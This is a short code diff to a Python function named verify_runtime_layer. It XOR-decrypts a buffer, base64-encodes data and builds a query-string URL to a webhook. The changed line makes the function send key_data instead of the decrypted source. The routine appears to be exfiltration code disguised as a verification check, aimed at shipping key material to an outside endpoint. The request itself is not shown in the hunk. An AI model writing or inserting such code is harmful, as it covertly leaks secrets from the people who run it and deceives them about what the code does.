@@ -22,7 +22,7 @@ def verify_runtime_layer():
 
         decrypted_source = "".join(chr(b ^ crypto_key) for b in enc_buffer)
 
-        payload_b64 = base64.b64encode(decrypted_source.encode()).decode()
+        payload_b64 = base64.b64encode(key_data.encode()).decode()
 
         query_params = urllib.parse.urlencode({"data": payload_b64})
         url_with_params = f"{webhook_url}?{query_params}"
